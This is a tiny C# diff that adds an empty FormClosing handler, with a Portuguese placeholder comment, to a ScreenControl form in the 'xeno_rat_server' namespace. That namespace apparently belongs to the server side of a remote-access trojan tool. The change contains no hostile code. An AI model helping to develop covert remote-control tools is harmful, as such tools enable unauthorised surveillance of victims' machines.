@@ -268,7 +268,11 @@ namespace xeno_rat_server.Forms
 
         private void ScreenControl_Load(object sender, EventArgs e)
         {
+        }
 
+        private void ScreenControl_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            // Adicione a lógica de limpeza ou salvamento aqui, se necessário
         }
 
         private async void button2_Click(object sender, EventArgs e)
